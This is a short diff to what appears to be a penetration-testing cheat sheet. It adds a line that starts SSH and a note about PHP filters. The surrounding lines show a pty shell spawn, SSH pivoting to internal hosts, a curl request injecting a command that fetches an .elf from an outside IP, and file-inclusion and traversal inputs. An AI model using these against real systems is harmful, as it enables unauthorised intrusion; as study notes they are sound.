@@ -1725,6 +1725,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
 
 # Local dynamic port forwarding
+sudo systemctl start ssh 
 ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
 
 # Remote port forwarding
@@ -1825,6 +1826,7 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
   - index.php?view=index.php  // this way we can check the file through view source
   - index.php?view=//10.10.14.19/kali
   - index.php?view=\\10.10.14.19\kali
+- Check index.php file with php filter
 - Check DT vulnerability On windows: Check both absolute path && relative path
   - C:\Windows\System32\drivers\etc\hosts
   - C:\inetpub\logs\LogFiles\W3SVC1\
